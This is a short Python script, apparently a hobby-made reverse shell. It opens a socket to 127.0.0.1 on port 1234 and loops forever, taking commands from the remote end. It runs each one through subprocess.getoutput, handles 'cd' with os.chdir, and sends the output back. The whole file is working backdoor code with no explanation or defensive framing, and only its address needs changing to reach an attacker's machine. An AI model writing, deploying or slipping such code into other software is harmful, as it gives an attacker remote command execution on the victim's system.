from socket import *
import subprocess
import os

client=socket(AF_INET,SOCK_STREAM)

client.connect(("127.0.0.1",1234))


while True:
    terminal=os.getcwd().encode()
    client.send(terminal)
       
    dastoor=client.recv(1234).decode()
    if "cd " in dastoor:
        dastoor=dastoor[3:]
        os.chdir(dastoor)
        client.send(b"CHANGE!")
        continue
    if dastoor == "EMPTY!":
        print("EMPTY!")
        continue
    response=subprocess.getoutput(dastoor)
       
    if response == "":
        client.send(b"EMPTY RESPONSE!")
    else:
        client.send(response.encode())


